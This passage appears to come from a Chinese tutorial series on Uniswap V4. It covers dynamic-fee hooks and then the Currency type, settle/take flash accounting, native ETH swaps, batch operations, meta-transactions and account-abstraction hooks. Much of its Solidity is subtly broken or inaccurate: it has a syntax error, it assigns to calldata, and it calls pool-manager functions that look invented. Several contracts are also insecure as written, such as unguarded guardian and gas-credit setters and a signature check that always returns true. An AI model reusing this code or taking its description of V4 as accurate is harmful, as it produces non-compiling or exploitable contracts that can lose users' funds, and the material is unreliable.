--&gt; V3Tiers\n    V3Tiers --&gt; V3Update\n\n    V4Dynamic --&gt; V4Custom\n    V4Custom --&gt; V4Hook\n\n    style V4Dynamic fill:#c8e6c9\n\n6.2 费用对比表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性V3V4费率设置固定4档任意自定义动态调整❌✅（Hook）调整频率从不实时自定义模型❌✅费用分配手动自动（Hook）协议费用固定开关动态配置\n\n7. 实际应用案例\n7.1 稳定币最优费率\n/// @notice 稳定币最优费率Hook\n/// @dev 稳定币对价格波动小，可以使用极低费率\ncontract StablecoinOptimalFeeHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 稳定币对使用极低费率（0.01%）\n        uint256 stablecoinFee = 100; // 0.01%\n \n        // 检查价格偏差\n        (uint160 sqrtPriceX96, , , ) = poolManager.slot0s(key.poolId);\n        uint256 currentPrice = uint256(sqrtPriceX96);\n        uint256 targetPrice = 1 &lt;&lt; 96; // 理想价格 = 1\n \n        // 价格偏差越大，费率越高\n        uint256 priceDeviation = currentPrice &gt; targetPrice\n            ? currentPrice - targetPrice\n            : targetPrice - currentPrice;\n \n        uint256 dynamicFee = stablecoinFee + (priceDeviation / 1e20);\n \n        // 限制在0.01%-0.05%范围内\n        if (dynamicFee &lt; 100) dynamicFee = 100;\n        if (dynamicFee &gt; 500) dynamicFee = 500;\n \n        uint16 hookFee = uint16(dynamicFee - 100);\n        poolManager.setHookFee(key.poolId, hookFee);\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n}\n7.2 高波动资产保护\n/// @notice 高波动资产保护Hook\n/// @dev 对高波动资产收取更高费用以补偿LP风险\ncontract HighVolatilityProtectionHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        bytes32 poolId = key.poolId;\n \n        // 计算最近24小时的价格变化\n        uint256 priceChange = _get24HourPriceChange(poolId);\n \n        // 价格变化越大，费率越高\n        uint256 baseFee = 3000; // 0.3%\n        uint256 volatilityFee = priceChange * 2; // 双倍价格变化作为额外费率\n \n        uint256 dynamicFee = baseFee + volatilityFee;\n \n        // 限制在1%以内\n        if (dynamicFee &gt; 10000) dynamicFee = 10000;\n \n        uint16 hookFee = uint16(dynamicFee - baseFee);\n        poolManager.setHookFee(poolId, hookFee);\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _get24HourPriceChange(bytes32 poolId) private view returns (uint256) {\n        // 实现价格变化计算\n        // ...\n        return 0;\n    }\n}\n\n8. 本章小结\n8.1 费用系统总结\nmindmap\n  root((V4费用系统))\n    费用结构\n      基础费率\n      Hook动态费率\n      协议费用\n    动态费率\n      波动率调整\n      交易量调整\n      时间调整\n      自定义模型\n    费用追踪\n      feeGrowthGlobal\n      Tick级别追踪\n      用户份额计算\n    费用分配\n      LP费用\n      Hook费用\n      协议费用\n\n8.2 关键概念回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念说明单位fee基础费率1e-6 (0.0001%)hookFeeHook控制的费率1e-6 (0.0001%)feeGrowthGlobal全局费用增长Q128协议费协议抽取的费用1e-4 (0.01%)\n8.3 动态费率策略\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n策略适用场景优点波动率调整高波动资产补偿LP风险交易量调整活跃交易对优化流动性时间调整特定时段需求灵活定价价格偏差稳定币对套利激励\n\n下一篇预告\n在下一篇文章中，我们将深入探讨账户抽象与原生ETH，包括：\n\nCurrency类型详解\nsettle()和take()函数原理\n批量操作实现\n元交易支持\nGas优化技巧\n\n\n参考资料\n\nUniswap V4 Core - PoolManager.sol\nUniswap V4 Core - Pool.sol\nUniswap V3 Fees\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/06-账户抽象与原生ETH":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/06-账户抽象与原生ETH","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/06-账户抽象与原生ETH.md","title":"06-账户抽象与原生ETH","links":[],"tags":[],"content":"死磕Uniswap V4（六）：账户抽象与原生ETH\n\n本文是「死磕Uniswap V4」系列的第六篇，深入剖析V4的账户抽象设计和原生ETH支持。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4概述与架构革命Singleton、Hooks、Flash Accounting02Hooks机制深度解析Hook接口、生命周期、实现模式03单例架构与瞬时会计PoolManager、Currency、Accounting04交换流程与Hook执行时序swap函数、Hook调用链、Gas分析05费用系统与动态费率自定义费率、动态调整、费用分配06账户抽象与原生ETHCurrency类型、settle/take、批量操作07安全分析与最佳实践Hook安全、MEV防护、审计要点\n\n1. Currency类型系统\n1.1 统一代币抽象\nV4引入Currency类型，统一处理原生ETH和ERC20代币：\n/// @notice Currency类型\n/// @dev 本质上是address，但提供类型安全\ntype Currency is address;\n \n/// @notice Currency库\nlibrary CurrencyLibrary {\n    /// @notice 原生ETH的特殊地址\n    Currency internal constant NATIVE = Currency.wrap(address(0));\n \n    /// @notice 判断是否为原生ETH\n    function isNative(Currency currency) internal pure returns (bool) {\n        return Currency.unwrap(currency) == address(0);\n    }\n \n    /// @notice 从address创建Currency\n    function fromAddress(address addr) internal pure returns (Currency) {\n        return Currency.wrap(addr);\n    }\n \n    /// @notice 获取底层地址\n    function toAddress(Currency currency) internal pure returns (address) {\n        return Currency.unwrap(currency);\n    }\n \n    /// @notice 获取Currency的转账编码\n    function transferCalldata(\n        Currency currency,\n        address to,\n        uint256 amount\n    ) internal pure returns (bytes memory) {\n        if (isNative(currency)) {\n            return abi.encodeWithSignature(&quot;transfer(uint256)&quot;, amount);\n        } else {\n            return abi.encodeWithSignature(\n                &quot;transfer(address,uint256)&quot;,\n                to,\n                amount\n            );\n        }\n    }\n \n    /// @notice 获取Currency的transferFrom编码\n    function transferFromCalldata(\n        Currency currency,\n        address from,\n        address to,\n        uint256 amount\n    ) internal pure returns (bytes memory) {\n        if (isNative(currency)) {\n            // ETH不支持transferFrom\n            return &quot;&quot;;\n        } else {\n            return abi.encodeWithSignature(\n                &quot;transferFrom(address,address,uint256)&quot;,\n                from,\n                to,\n                amount\n            );\n        }\n    }\n}\n1.2 Currency与address的对应\ngraph LR\n    subgraph Mapping[&quot;Currency映射&quot;]\n        A[&quot;address(0)&quot;] --&gt; B[&quot;NATIVE ETH&quot;]\n        C[&quot;address(WETH)&quot;] --&gt; D[&quot;WETH Token&quot;]\n        E[&quot;address(USDC)&quot;] --&gt; F[&quot;USDC Token&quot;]\n        G[&quot;address(token)&quot;] --&gt; H[&quot;Any ERC20&quot;]\n    end\n\n    style A fill:#ffcdd2\n    style B fill:#c8e6c9\n\n1.3 Currency操作封装\n/// @notice Currency操作库\nlibrary CurrencyFunctions {\n    using SafeERC20 for IERC20;\n \n    /// @notice 获取余额\n    function balanceOf(Currency currency, address account) internal view returns (uint256) {\n        if (CurrencyLibrary.isNative(currency)) {\n            return account.balance;\n        } else {\n            return IERC20(CurrencyLibrary.toAddress(currency)).balanceOf(account);\n        }\n    }\n \n    /// @notice 转账\n    function transfer(\n        Currency currency,\n        address to,\n        uint256 amount\n    ) internal {\n        if (CurrencyLibrary.isNative(currency)) {\n            payable(to).transfer(amount);\n        } else {\n            IERC20(CurrencyLibrary.toAddress(currency)).safeTransfer(to, amount);\n        }\n    }\n \n    /// @notice 从指定地址转账\n    function transferFrom(\n        Currency currency,\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        if (CurrencyLibrary.isNative(currency)) {\n            // ETH需要msg.value\n            require(msg.value &gt;= amount, &quot;Insufficient ETH&quot;);\n        } else {\n            IERC20(CurrencyLibrary.toAddress(currency)).safeTransferFrom(from, to, amount);\n        }\n    }\n \n    /// @notice 授权\n    function approve(\n        Currency currency,\n        address spender,\n        uint256 amount\n    ) internal {\n        require(!CurrencyLibrary.isNative(currency), &quot;Cannot approve ETH&quot;);\n        IERC20(CurrencyLibrary.toAddress(currency)).safeApprove(spender, amount);\n    }\n \n    /// @notice 获取代币符号\n    function symbol(Currency currency) internal view returns (string memory) {\n        if (CurrencyLibrary.isNative(currency)) {\n            return &quot;ETH&quot;;\n        } else {\n            return IERC20Metadata(CurrencyLibrary.toAddress(currency)).symbol();\n        }\n    }\n \n    /// @notice 获取代币精度\n    function decimals(Currency currency) internal view returns (uint8) {\n        if (CurrencyLibrary.isNative(currency)) {\n            return 18;\n        } else {\n            return IERC20Metadata(CurrencyLibrary.toAddress(currency)).decimals();\n        }\n    }\n}\n\n2. 瞬时会计深度解析\n2.1 瞬时会计架构\nflowchart TB\n    subgraph Accounting[&quot;瞬时会计系统&quot;]\n        Delta[deltas映射&lt;br/&gt;account =&gt; currency =&gt; int256]\n        Settle[settle函数&lt;br/&gt;声明应付款]\n        Take[take函数&lt;br/&gt;声明应收款]\n        Unlock[unlock函数&lt;br/&gt;结算所有差额]\n    end\n\n    subgraph Flow[&quot;流程&quot;]\n        A[用户操作] --&gt; B[记录deltas]\n        B --&gt; C[更多操作]\n        C --&gt; D[累积deltas]\n        D --&gt; E[unlock时结算]\n    end\n\n    Delta --&gt; Settle\n    Delta --&gt; Take\n    Settle --&gt; Unlock\n    Take --&gt; Unlock\n\n    style Delta fill:#e3f2fd\n    style Unlock fill:#c8e6c9\n\n2.2 deltas数据结构\n/// @notice 账户差额记录\n/// @dev int256类型：\n///      - 正数：应收款（Pool欠用户）\n///      - 负数：应付款（用户欠Pool）\nmapping(address account =&gt; mapping(Currency currency =&gt; int256)) public deltas;\n \n/// @notice 差额变化结构\nstruct BalanceDelta {\n    int256 delta0;  // currency0的变化\n    int256 delta1;  // currency1的变化\n}\n \n/// @notice 差额操作记录（用于结算）\nstruct DeltaOperation {\n    address account;\n    Currency currency;\n    int256 amount;\n}\n \nDeltaOperation[] private deltaOperations;  // 用于追踪所有操作\n2.3 settle() 函数详解\n/// @notice 用户声明将支付指定数量的代币\n/// @param currency 要支付的代币类型\n/// @param amount 支付数量\n/// @dev 此函数记录用户的应付款，实际转账在unlock时进行\nfunction settle(Currency currency, uint256 amount) external {\n    // 1. 验证锁定状态\n    require(locked != 0, &quot;Not locked&quot;);\n \n    // 2. 记录差额（负数表示应付款）\n    deltas[msg.sender][currency] -= int256(amount);\n \n    // 3. 对于原生ETH，立即验证msg.value\n    if (CurrencyLibrary.isNative(currency)) {\n        // 计算用户当前应付的ETH总额\n        int256 currentDelta = deltas[msg.sender][currency];\n        require(currentDelta &lt;= 0, &quot;Invalid delta&quot;);\n \n        uint256 payableAmount = uint256(-currentDelta);\n        require(msg.value &gt;= payableAmount, &quot;Insufficient ETH&quot;);\n    }\n \n    // 4. 记录操作\n    deltaOperations.push(DeltaOperation({\n        account: msg.sender,\n        currency: currency,\n        amount: -int256(amount)\n    }));\n \n    emit Settle(msg.sender, currency, amount);\n}\n \n/// @notice 批量settle\nfunction settleAll(\n    Currency[] calldata currencies,\n    uint256[] calldata amounts\n) external {\n    require(currencies.length == amounts.length, &quot;Length mismatch&quot;);\n    require(locked != 0, &quot;Not locked&quot;);\n \n    for (uint256 i = 0; i &lt; currencies.length; i++) {\n        deltas[msg.sender][currencies[i]] -= int256(amounts[i]);\n \n        if (CurrencyLibrary.isNative(currencies[i])) {\n            int256 currentDelta = deltas[msg.sender][currencies[i]];\n            require(uint256(-currentDelta) &lt;= msg.value, &quot;Insufficient ETH&quot;);\n        }\n \n        emit Settle(msg.sender, currencies[i], amounts[i]);\n    }\n}\n2.4 take() 函数详解\n/// @notice 用户声明将接收指定数量的代币\n/// @param currency 要接收的代币类型\n/// @param recipient 接收地址\n/// @param amount 接收数量\n/// @dev 此函数记录用户的应收款，实际转账在unlock时进行\nfunction take(\n    Currency currency,\n    address recipient,\n    uint256 amount\n) external {\n    // 1. 验证锁定状态\n    require(locked != 0, &quot;Not locked&quot;);\n \n    // 2. 记录差额（正数表示应收款）\n    deltas[recipient][currency] += int256(amount);\n \n    // 3. 记录操作\n    deltaOperations.push(DeltaOperation({\n        account: recipient,\n        currency: currency,\n        amount: int256(amount)\n    }));\n \n    emit Take(msg.sender, recipient, currency, amount);\n}\n \n/// @notice 批量take\nfunction takeAll(\n    Currency[] calldata currencies,\n    address recipient,\n    uint256[] calldata amounts\n) external {\n    require(currencies.length == amounts.length, &quot;Length mismatch&quot;);\n    require(locked != 0, &quot;Not locked&quot;);\n \n    for (uint256 i = 0; i &lt; currencies.length; i++) {\n        deltas[recipient][currencies[i]] += int256(amounts[i]);\n        emit Take(msg.sender, recipient, currencies[i], amounts[i]);\n    }\n}\n2.5 unlock结算详解\n/// @notice 内部结算函数\n/// @dev 在unlock时调用，结算所有账户的差额\nfunction _accountingBalance() internal {\n    // 1. 遍历所有有差额的账户\n    for (uint256 i = 0; i &lt; accountsWithDeltas.length; i++) {\n        address account = accountsWithDeltas[i];\n \n        // 2. 遍历该账户的所有差额代币\n        for (uint256 j = 0; j &lt; currenciesWithDeltas.length; j++) {\n            Currency currency = currenciesWithDeltas[j];\n            int256 delta = deltas[account][currency];\n \n            if (delta == 0) continue;\n \n            if (delta &gt; 0) {\n                // 正数：Pool需要支付给用户\n                _payToAccount(account, currency, uint256(delta));\n            } else {\n                // 负数：用户需要支付给Pool\n                _collectFromAccount(account, currency, uint256(-delta));\n            }\n \n            // 清零差额\n            deltas[account][currency] = 0;\n        }\n    }\n \n    // 3. 清空列表\n    delete accountsWithDeltas;\n    delete currenciesWithDeltas;\n}\n \n/// @notice 支付给账户\nfunction _payToAccount(\n    address account,\n    Currency currency,\n    uint256 amount\n) ) private {\n    if (CurrencyLibrary.isNative(currency)) {\n        // 原生ETH：直接发送\n        payable(account).transfer(amount);\n    } else {\n        // ERC20：转账\n        IERC20(CurrencyLibrary.toAddress(currency)).transfer(account, amount);\n    }\n \n    emit Payment(account, currency, amount);\n}\n \n/// @notice 从账户收取\nfunction _collectFromAccount(\n    address account,\n    Currency currency,\n    uint256 amount\n) private {\n    if (CurrencyLibrary.isNative(currency)) {\n        // ETH在settle时已经验证msg.value\n        // 这里不需要额外操作\n        // 但需要退还多余的ETH\n        int256 remainingDelta = deltas[account][currency];\n        if (remainingDelta &lt; 0) {\n            // 用户支付了足够的ETH\n            // 不需要退款（msg.value在交易结束时自动退还）\n        }\n    } else {\n        // ERC20：transferFrom\n        IERC20(CurrencyLibrary.toAddress(currency)).transferFrom(\n            account,\n            address(this),\n            amount\n        );\n    }\n \n    emit Collection(account, currency, amount);\n}\n\n3. 原生ETH支持\n3.1 ETH vs WETH对比\ngraph TB\n    subgraph WETHMode[&quot;V3: WETH模式&quot;]\n        W1[用户持有ETH]\n        W2[调用WETH.deposit]\n        W3[获得WETH]\n        W4[授权WETH给Uniswap]\n        W5[执行swap]\n        W6[收到WETH]\n        W7[调用WETH.withdraw]\n        W8[获得ETH]\n    end\n\n    subgraph NativeMode[&quot;V4: 原生ETH模式&quot;]\n        N1[用户持有ETH]\n        N2[直接swap&lt;br/&gt;currency = NATIVE]\n        N3[收到ETH]\n    end\n\n    style W2 fill:#ffcdd2\n    style W4 fill:#ffcdd2\n    style W6 fill:#ffcdd2\n    style W7 fill:#ffcdd2\n    style N2 fill:#c8e6c9\n\n3.2 原生ETH交换示例\n/// @notice 原生ETH交换示例\n/// @param amountInEth 输入的ETH数量\n/// @param amountOutMin 最小输出数量\nfunction swapEthForToken(\n    uint256 amountInEth,\n    uint256 amountOutMin,\n    PoolKey calldata key\n) external payable returns (uint256 amountOut) {\n    // 验证currency0是原生ETH\n    require(\n        CurrencyLibrary.isNative(key.currency0),\n        &quot;Currency0 must be ETH&quot;\n    );\n \n    // 构造交换参数\n    SwapParams memory params = SwapParams({\n        zeroForOne: true,  // ETH → Token\n        amountSpecified: int256(amountInEth),\n        sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,\n        hookData: &quot;&quot;\n    });\n \n    // 设置限制\n    BalanceDelta memory limits = BalanceDelta({\n        delta0: -int256(amountInEth),  // 最多支付amountInEth的ETH\n        delta1: int256(amountOutMin)   // 最少收到amountOutMin的Token\n    });\n \n    // 执行交换\n    BalanceDelta memory delta = poolManager.swap{value: amountInEth}(key, params, limits);\n \n    // 记录ETH的支付（通过msg.value）\n    // 注意：原生ETH的settle是通过msg.value验证的\n \n    amountOut = uint256(delta.delta1);\n \n    emit EthSwap(msg.sender, amountInEth, amountOut);\n}\n \n/// @notice Token换ETH示例\nfunction swapTokenForEth(\n    uint256 amountIn,\n    uint256 amountOutEthMin,\n    PoolKey calldata key\n) external returns (uint256 amountOutEth) {\n    // 验证currency1是原生ETH\n    require(\n        CurrencyLibrary.isNative(key.currency1),\n        &quot;Currency1 must be ETH&quot;\n    );\n \n    // 构造交换参数\n    SwapParams memory params = SwapParams({\n        zeroForOne: false,  // Token → ETH\n        amountSpecified: int256(amountIn),\n        sqrtPriceLimitX96: TickMath.MAX_SQRT_RATIO - 1,\n        hookData: &quot;&quot;\n    });\n \n    // 设置限制\n    BalanceDelta memory limits = BalanceDelta({\n        delta0: int256(amountOutEthMin),  // 最少收到amountOutEthMin的ETH\n        delta1: -int256(amountIn)          // 最多支付amountIn的Token\n    });\n \n    // 执行交换\n    BalanceDelta memory delta = poolManager.swap(key, params, limits);\n \n    // settle Token\n    poolManager.settle(key.currency0, amountIn);\n \n    // take ETH\n    poolManager.take(CurrencyLibrary.NATIVE, msg.sender, uint256(delta.delta0));\n \n    amountOutEth = uint256(delta.delta0);\n \n    emit TokenSwap(msg.sender, amountIn, amountOutEth);\n}\n3.3 Gas节省分析\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作V3 (WETH)V4 (Native)节省WETH包装~42,0000100%WETH解包~42,0000100%授权检查~5,0000100%approve调用~46,0000100%单笔ETH交易~135,000~50,000~63%\n\n4. 批量操作\n4.1 批量交换实现\n/// @notice 批量交换路由\n/// @param route 交换路由：包含多个池子和交换参数\n/// @param amountIn 输入数量\n/// @param amountOutMin 最小输出数量\nfunction batchSwap(\n    Route calldata route,\n    uint256 amountIn,\n    uint256 amountOutMin\n) external payable returns (uint256 amountOut) {\n    // 锁定\n    lock();\n \n    uint256 currentAmount = amountIn;\n \n    // 执行路由中的每一步\n    for (uint256 i = 0; i &lt; route.keys.length; i++) {\n        PoolKey calldata key = route.keys[i];\n        SwapParams calldata params = route.params[i];\n \n        // 更新输入数量\n        params.amountSpecified = int256(currentAmount);\n \n        // 设置默认限制\n        BalanceDelta memory limits = BalanceDelta({\n            delta0: type(int256).min,\n            delta1: type(int256).min\n        });\n \n        // 执行交换\n        BalanceDelta memory delta = poolManager.swap{value: msg.value}(key, params, limits);\n \n        // 更新下一笔的输入数量\n        currentAmount = params.zeroForOne\n            ? uint256(delta.delta1)\n            : uint256(delta.delta0);\n    }\n \n    // 验证最终输出\n    require(currentAmount &gt;= amountOutMin, &quot;Insufficient output&quot;);\n \n    // settle第一个代币\n    poolManager.settle(route.keys[0].currency0, amountIn);\n \n    // take最后一个代币\n    Currency lastCurrency = route.keys[route.keys.length - 1].currency1;\n    poolManager.take(lastCurrency, msg.sender, currentAmount);\n \n    // 解锁并结算\n    unlock();\n \n    amountOut = currentAmount;\n \n    emit BatchSwap(msg.sender, route, amountIn, amountOut);\n}\n \n/// @notice 路由结构\nstruct Route {\n    PoolKey[] keys;      // 池子数组\n    SwapParams[] params; // 参数数组\n}\n4.2 批量流动性管理\n/// @notice 批量修改流动性头寸\nfunction batchModifyPositions(\n    PositionParams[] calldata positions\n) external payable {\n    lock();\n \n    for (uint256 i = 0; i &lt; positions.length; i++) {\n        PositionParams calldata pos = positions[i];\n \n        ModifyPositionParams memory params = ModifyPositionParams({\n            tickLower: pos.tickLower,\n            tickUpper: pos.tickUpper,\n            liquidityDelta: pos.liquidityDelta\n        });\n \n        poolManager.modifyPosition(pos.key, params);\n \n        // 如果是添加流动性，settle代币\n        if (pos.liquidityDelta &gt; 0) {\n            (uint256 amount0, uint256 amount1) = _getLiquidityAmounts(pos);\n            poolManager.settle(pos.key.currency0, amount0);\n            poolManager.settle(pos.key.currency1, amount1);\n        }\n    }\n \n    unlock();\n}\n \n/// @notice 头寸参数\nstruct PositionParams {\n    PoolKey key;\n    int24 tickLower;\n    int24 tickUpper;\n    int128 liquidityDelta;\n}\n4.3 批量操作Gas对比\ngraph LR\n    subgraph Single[&quot;单独操作&quot;]\n        S1[操作1] --&gt; S2[操作2] --&gt; S3[操作3]\n        S1Gas[~75k]\n        S2Gas[~75k]\n        S3Gas[~75k]\n        Total1[~225k]\n    end\n\n    subgraph Batch[&quot;批量操作&quot;]\n        B1[lock一次]\n        B2[执行所有操作]\n        B3[unlock一次]\n        B1Gas[~5k]\n        B2Gas[~150k]\n        B3Gas[~10k]\n        Total2[~165k]\n    end\n\n    Total1 -.-&gt;|节省 27%| Total2\n\n    style B2 fill:#c8e6c9\n\n\n5. 元交易支持\n5.1 元交易设计\n通过Hooks可以实现元交易（用户不需要支付gas）：\n/// @notice 元交易支持Hook\ncontract MetaTransactionHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    mapping(address =&gt; uint256) public nonces;\n    mapping(address =&gt; uint256) public gasCredits;\n \n    /// @notice 元交易签名\n    struct MetaTransaction {\n        address signer;           // 签名者\n        PoolKey key;              // 池子\n        SwapParams params;        // 交换参数\n        uint256 nonce;            // nonce\n        uint256 gasPrice;         // gas价格\n        uint256 gasLimit;         // gas限制\n        bytes signature;          // 签名\n    }\n \n    /// @notice 执行元交易\n    function executeMetaTransaction(\n        MetaTransaction calldata metaTx\n    ) external {\n        // 1. 验证签名\n        bytes32 messageHash = keccak256(abi.encode(\n            metaTx.signer,\n            metaTx.key,\n            metaTx.params,\n            metaTx.nonce,\n            metaTx.gasPrice,\n            metaTx.gasLimit,\n            block.chainid\n        ));\n \n        bytes32 ethSignedMessageHash = keccak256(\n            abi.encodePacked(&quot;\\x19Ethereum Signed Message:\\n32&quot;, messageHash)\n        );\n \n        (address recovered, ) = recoverSigner(\n            ethSignedMessageHash,\n            metaTx.signature\n        );\n \n        require(recovered == metaTx.signer, &quot;Invalid signature&quot;);\n        require(nonces[metaTx.signer] == metaTx.nonce, &quot;Invalid nonce&quot;);\n \n        // 2. 验证gas积分\n        uint256 gasCost = metaTx.gasPrice * metaTx.gasLimit;\n        require(gasCredits[metaTx.signer] &gt;= gasCost, &quot;Insufficient gas credit&quot;);\n \n        // 3. 执行交换\n        BalanceDelta memory limits = BalanceDelta({\n            delta0: type(int256).min,\n            delta1: type(int256).min\n        });\n \n        BalanceDelta memory delta = poolManager.swap(\n            metaTx.key,\n            metaTx.params,\n            limits\n        );\n \n        // 4. 扣除gas积分\n        gasCredits[metaTx.signer] -= gasCost;\n \n        // 5. 更新nonce\n        nonces[metaTx.signer]++;\n \n        emit MetaTransactionExecuted(metaTx.signer, delta);\n    }\n \n    /// @notice 添加gas积分\n    function addGasCredits(address user, uint256 amount) external {\n        gasCredits[user] += amount;\n        emit GasCreditsAdded(user, amount);\n    }\n \n    function recoverSigner(\n        bytes32 hash,\n        bytes memory signature\n    ) private pure returns (address, ECDSA.RecoverError) {\n        return ECDSA.recover(hash, signature);\n    }\n \n    event MetaTransactionExecuted(address indexed signer, BalanceDelta delta);\n    event GasCreditsAdded(address indexed user, uint256 amount);\n}\n5.2 Relayer模式\n/// @notice Relayer转发交易\ncontract Relayer {\n    IPoolManager public immutable poolManager;\n \n    mapping(address =&gt; uint256) public nonces;\n \n    struct ForwardedRequest {\n        address from;             // 原始发起者\n        PoolKey key;\n        SwapParams params;\n        uint256 nonce;\n        uint256 deadline;\n        bytes signature;\n    }\n \n    /// @notice 转发交易\n    function execute(\n        ForwardedRequest calldata req,\n        bytes calldata extraData\n    ) external payable {\n        // 1. 验证deadline\n        require(block.timestamp &lt;= req.deadline, &quot;Expired&quot;);\n \n        // 2. 验证签名\n        bytes32 messageHash = keccak256(abi.encode(\n            req.from,\n            req.key,\n            req.params,\n            req.nonce,\n            req.deadline,\n            extraData\n        ));\n \n        _verifySignature(messageHash, req.signature, req.from);\n \n        // 3. 验证nonce\n        require(nonces[req.from] == req.nonce, &quot;Invalid nonce&quot;);\n \n        // 4. 执行交换（使用relayer的msg.value）\n        BalanceDelta memory limits = BalanceDelta({\n            delta0: type(int256).min,\n            delta1: type(int256).min\n        });\n \n        poolManager.swap{value: msg.value}(req.key, req.params, limits);\n \n        // 5. 更新nonce\n        nonces[req.from]++;\n \n        // 6. 如果用户需要支付代币，从用户收取\n        // （通过Hook实现）\n \n        emit Forwarded(req.from, msg.sender, req.nonce);\n    }\n \n    function _verifySignature(\n        bytes32 hash,\n        bytes memory signature,\n        address expectedSigner\n    ) private pure {\n        bytes32 ethSignedHash = keccak256(\n            abi.encodePacked(&quot;\\x19Ethereum Signed Message:\\n32&quot;, hash)\n        );\n \n        address signer = ECDSA.recover(ethSignedHash, signature);\n        require(signer == expectedSigner, &quot;Invalid signature&quot;);\n    }\n \n    event Forwarded(address indexed from, address indexed relayer, uint256 nonce);\n}\n\n6. 账户抽象应用\n6.1 账户抽象钱包集成\n/// @notice 支持账户抽象钱包的Hook\ncontract AccountAbstractionHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 支持的ERC-4337钱包聚合器\n    mapping(address =&gt; bool) public supportedAggregators;\n \n    /// @notice 检查是否为AA钱包\n    function isAccountAbstractedWallet(address account) public view returns (bool) {\n        // 检查是否为支持的AA钱包\n        // 例如：Smart Wallet、Argent、Safe等\n        return _isSmartWallet(account);\n    }\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 如果是AA钱包，允许特殊处理\n        if (isAccountAbstractedWallet(sender)) {\n            // 1. 检查paymaster是否支持\n            if (_hasPaymaster(sender)) {\n                // 2. 跳过余额验证\n                // 3. 允许延迟支付\n                return (IHooks.beforeSwap.selector, 0, 0);\n            }\n        }\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _isSmartWallet(address account) private view returns (bool) {\n        // 实现智能钱包检测逻辑\n        // 可以通过检查代码大小或调用特定方法来识别\n        return account.code.length &gt; 0;\n    }\n \n    function _hasPaymaster(address account) private view returns (bool) {\n        // 检查钱包是否有paymaster支持\n        // 可以通过调用钱包的方法来确认\n        return true; // 简化示例\n    }\n}\n6.2 社交恢复集成\n/// @notice 社交恢复钱包支持\ncontract SocialRecoverySupport is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 社交恢复映射\n    mapping(address =&gt; address[]) public guardians;\n    mapping(address =&gt; mapping(address =&gt; bool)) public isGuardian;\n \n    /// @notice 添加守护者\n    function addGuardian(address wallet, address guardian) external {\n        require(!isGuardian[wallet][guardian], &quot;Already guardian&quot;);\n        guardians[wallet].push(guardian);\n        isGuardian[wallet][guardian] = true;\n \n        emit GuardianAdded(wallet, guardian);\n    }\n \n    /// @notice 社交恢复\n    function recoverWallet(\n        address oldWallet,\n        address newWallet,\n        uint8 requiredSignatures,\n        bytes calldata signature\n    ) external {\n        // 验证守护者签名\n        bytes32 messageHash = keccak256(abi.encodePacked(\n            &quot;RECOVER&quot;,\n            oldWallet,\n            newWallet,\n            block.number\n        ));\n \n        uint256 validSignatures = 0;\n \n        for (uint256 i = 0; i &lt; guardians[oldWallet].length; i++) {\n            address guardian = guardians[oldWallet][i];\n            if (_isValidSignature(messageHash, signature, guardian)) {\n                validSignatures++;\n            }\n        }\n \n        require(validSignatures &gt;= requiredSignatures, &quot;Insufficient signatures&quot;);\n \n        // 转移所有权\n        _transferOwnership(oldWallet, newWallet);\n \n        emit WalletRecovered(oldWallet, newWallet);\n    }\n \n    function _isValidSignature(\n        bytes32 hash,\n        bytes calldata signature,\n        address signer\n    ) private pure returns (bool) {\n        // 实现签名验证\n        return true;\n    }\n \n    function _transferOwnership(address from, address to) private {\n        // 实现所有权转移\n    }\n \n    event GuardianAdded(address indexed wallet, address guardian);\n    event WalletRecovered(address indexed oldWallet, address indexed newWallet);\n}\n\n7. 本章小结\n7.1 账户抽象总结\nmindmap\n  root((账户抽象))\n    Currency类型\n      原生ETH address(0)\n      ERC20代币\n      统一接口\n    瞬时会计\n      deltas记录\n      settle声明应付款\n      take声明应收款\n      unlock统一结算\n    原生ETH支持\n      无需WETH\n      msg.value验证\n      直接转账\n    批量操作\n      单次锁定\n      多次操作\n      统一结算\n    元交易\n      签名验证\n      nonce防重放\n      gas积分\n\n7.2 关键函数回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n函数用途参数settle()声明应付款currency, amounttake()声明应收款currency, recipient, amountunlock()结算所有差额-isNative()判断是否为ETHcurrencybalanceOf()获取余额currency, account\n7.3 Gas优化要点\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优化节省说明原生ETH~42k × 